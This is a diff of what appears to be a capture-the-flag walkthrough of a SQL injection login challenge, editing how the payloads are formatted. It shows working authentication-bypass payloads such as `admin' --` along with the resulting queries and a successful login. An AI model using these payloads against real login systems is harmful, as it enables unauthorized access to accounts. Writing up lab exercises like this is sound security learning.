@@ -30,12 +30,12 @@ SQLi detected.
 4. Since the password field is filtered, I focused on injecting only through the username field.
 5. My second attempt was using `' OR true -- ` to comment out and avoid injecting into password:
 ```sql
-username: ' OR true --
+username: ' OR true -- '
 password: ''
 ```
 To which I was given the response:
 ```sql
-username: ' OR true --
+username: ' OR true -- '
 password: ''
 SQL query: SELECT * FROM users WHERE name='' OR true --' AND password=''
 SQLi detected.
@@ -44,7 +44,7 @@ SQLi detected.
 7. It also means logging in requires matching an existing username, not just bypassing the password.
 8. Because commenting out the password only works if the username exists in the database, I tried:
 ```sql
-username: admin' --
+username: admin' -- '
 password: 
 SQL query: SELECT * FROM users WHERE name='admin' --' AND password=''
 Logged in!
